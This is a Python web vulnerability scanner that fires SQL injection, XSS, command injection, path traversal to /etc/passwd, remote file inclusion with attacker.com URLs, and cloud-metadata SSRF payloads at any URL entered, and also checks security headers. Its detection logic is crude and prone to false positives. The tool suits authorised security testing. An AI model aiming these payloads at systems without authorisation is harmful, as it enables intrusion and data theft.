import requests
from requests.exceptions import RequestException
from concurrent.futures import ThreadPoolExecutor
import time
import re
import logging
from bs4 import BeautifulSoup
import urllib.parse
import threading

# Setup logging
logging.basicConfig(filename='web_scanner.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Caching results to avoid duplicate tests
result_cache = {}
lock = threading.Lock()

# Rate limiter to avoid server overload
def rate_limiter(delay):
    time.sleep(delay)

# SQL Injection Test with Enhanced Response Analysis
def test_sql_injection(url):
    sql_payloads = [
        "' OR '1'='1", "' UNION SELECT null, null--", "' AND 'a'='a", "' OR SLEEP(5)--",
        "' OR 1=1--", "'; WAITFOR DELAY '0:0:5'--", "' UNION SELECT database(), user()",
        "'; SELECT * FROM users WHERE '1'='1';--", "' AND (SELECT COUNT(*) FROM users) > 0 --"
    ]
    
    db_errors = ["mysql", "syntax", "sql", "oracle", "pgsql", "syntax error", "mssql"]
    vulnerable = False

    try:
        normal_response = requests.get(f"{url}?id=1", timeout=10)
    except RequestException:
        logging.error(f"Error fetching normal response for {url}")
        return False

    for payload in sql_payloads:
        test_url = f"{url}?id={urllib.parse.quote(payload)}"
        try:
            rate_limiter(1)
            response = requests.get(test_url, timeout=10)
            if any(error in response.text.lower() for error in db_errors):
                logging.info(f"SQL Injection vulnerability detected at {test_url}")
                vulnerable = True
                break
            elif response.elapsed.total_seconds() > 5:  # Time-based SQLi
                logging.info(f"Blind SQL Injection vulnerability detected at {test_url}")
                vulnerable = True
                break
            elif normal_response.text != response.text:
                logging.info(f"Boolean-based SQL Injection detected at {test_url}")
                vulnerable = True
                break
        except RequestException as e:
            logging.error(f"SQL Injection error at {test_url}: {e}")

    return vulnerable

# Cross-Site Scripting (XSS) Test with Context-aware Payloads
def test_xss(url):
    xss_payloads = [
        "<script>alert(1)</script>", "%3Cscript%3Ealert(1)%3C/script%3E",
        "\"'><script>alert(1)</script>", "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>", "<iframe src=javascript:alert(1)>", 
        "><script>alert('XSS')</script>", "<script>document.write('<img src=\"x\" onerror=\"alert(1)\">');</script>"
    ]
    
    vulnerable = False

    for payload in xss_payloads:
        test_url = f"{url}?q={urllib.parse.quote(payload)}"
        try:
            rate_limiter(1)
            response = requests.get(test_url, timeout=10)
            if re.search(r"<script>alert\(1\)</script>", response.text) or payload in response.text:
                logging.info(f"XSS vulnerability detected at {test_url}")
                vulnerable = True
                break
        except RequestException as e:
            logging.error(f"XSS error at {test_url}: {e}")

    return vulnerable

# Command Injection Test with Command Execution Detection
def test_command_injection(url):
    command_payloads = ["test; ls", "test && whoami", "test | whoami", "$(whoami)", "`whoami`", "test; echo 'vuln'"]
    
    vulnerable = False

    for payload in command_payloads:
        test_url = f"{url}?cmd={urllib.parse.quote(payload)}"
        try:
            rate_limiter(1)
            response = requests.get(test_url, timeout=10)
            if re.search(r"(root|user|bin|vuln)", response.text):
                logging.info(f"Command Injection vulnerability detected at {test_url}")
                vulnerable = True
                break
        except RequestException as e:
            logging.error(f"Command Injection error at {test_url}: {e}")
            continue
    
    return vulnerable

# Local File Inclusion (LFI) Test with Enhanced Patterns
def test_lfi(url):
    lfi_payloads = [
        "../../../../etc/passwd", "../../../../windows/system32/drivers/etc/hosts",
        "../..//etc/passwd", "..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    ]
    
    vulnerable = False

    for payload in lfi_payloads:
        test_url = f"{url}?file={urllib.parse.quote(payload)}"
        try:
            rate_limiter(1)
            response = requests.get(test_url, timeout=10)
            if "root:" in response.text or "[global]" in response.text:
                logging.info(f"LFI vulnerability detected at {test_url}")
                vulnerable = True
                break
        except RequestException as e:
            logging.error(f"LFI error at {test_url}: {e}")
            continue

    return vulnerable

# Remote File Inclusion (RFI) Test
def test_rfi(url):
    rfi_payloads = [
        "http://example.com/malicious_file.txt", 
        "http://attacker.com/malicious_file.php", 
        "https://attacker.com/evil_script.js"
    ]
    
    vulnerable = False

    for payload in rfi_payloads:
        test_url = f"{url}?file={urllib.parse.quote(payload)}"
        try:
            rate_limiter(1)
            response = requests.get(test_url, timeout=10)
            if "malicious" in response.text:
                logging.info(f"RFI vulnerability detected at {test_url}")
                vulnerable = True
                break
        except RequestException as e:
            logging.error(f"RFI error at {test_url}: {e}")
            continue

    return vulnerable

# SSRF Test with URL payloads
def test_ssrf(url):
    ssrf_payloads = [
        "http://localhost:8080", 
        "http://169.254.169.254/latest/meta-data/", 
        "http://127.0.0.1:9000"
    ]
    
    vulnerable = False

    for payload in ssrf_payloads:
        test_url = f"{url}?url={urllib.parse.quote(payload)}"
        try:
            rate_limiter(1)
            response = requests.get(test_url, timeout=10)
            if "meta-data" in response.text or "localhost" in response.text:
                logging.info(f"SSRF vulnerability detected at {test_url}")
                vulnerable = True
                break
        except RequestException as e:
            logging.error(f"SSRF error at {test_url}: {e}")
            continue

    return vulnerable

# Security Headers Check with Comprehensive Validation
def check_security_headers(url):
    try:
        if url in result_cache:
            return result_cache[url]

        response = requests.get(url, timeout=10)
        headers = response.headers
        missing_headers = []
        misconfigured_headers = []

        required_headers = {
            'X-Content-Type-Options': 'nosniff',
            'Strict-Transport-Security': 'max-age',
            'X-XSS-Protection': '1; mode=block',
            'Content-Security-Policy': None,
            'X-Frame-Options': 'DENY',
            'Referrer-Policy': None,
            'Permissions-Policy': None
        }
        
        for header, required_value in required_headers.items():
            if header not in headers:
                missing_headers.append(header)
            elif required_value and required_value not in headers.get(header, ''):
                misconfigured_headers.append(f"{header} (Incorrect value)")

        lock.acquire()
        result_cache[url] = (missing_headers, misconfigured_headers)
        lock.release()

        if missing_headers:
            logging.warning(f"Missing headers at {url}: {', '.join(missing_headers)}")
        if misconfigured_headers:
            logging.warning(f"Misconfigured headers at {url}: {', '.join(misconfigured_headers)}")
    except RequestException as e:
        logging.error(f"Header check error at {url}: {e}")

# Advanced Web Crawler for AJAX and Hidden Elements
def web_crawler(url):
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        links = [a['href'] for a in soup.find_all('a', href=True)]
        
        # Add forms and links for further testing
        return forms, links
    except Exception as e:
        logging.error(f"Crawling error at {url}: {e}")
        return [], []

# Function to handle threading and scanning
def scan_web_application(url):
    print(f"\n{'='*60}\nStarting Web Application Security Scan for: {url}\n{'='*60}\n")
    vulnerabilities = []

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {
            'SQL Injection': executor.submit(test_sql_injection, url),
            'Cross-Site Scripting (XSS)': executor.submit(test_xss, url),
            'Command Injection': executor.submit(test_command_injection, url),
            'Local File Inclusion (LFI)': executor.submit(test_lfi, url),
            'Remote File Inclusion (RFI)': executor.submit(test_rfi, url),
            'Server-Side Request Forgery (SSRF)': executor.submit(test_ssrf, url),
            'Security Headers': executor.submit(check_security_headers, url)
        }

        for name, future in futures.items():
            if future.result():
                vulnerabilities.append(name)

    print(f"{'='*60}\nScan Results for {url}\n{'='*60}")
    if vulnerabilities:
        print("⚠️ Vulnerabilities found:")
        for vuln in vulnerabilities:
            print(f"  - {vuln}")
    else:
        print("✅ No vulnerabilities found.")

# Example usage
if __name__ == "__main__":
    target_url = input("Enter the URL to scan: ")
    scan_web_application(target_url)
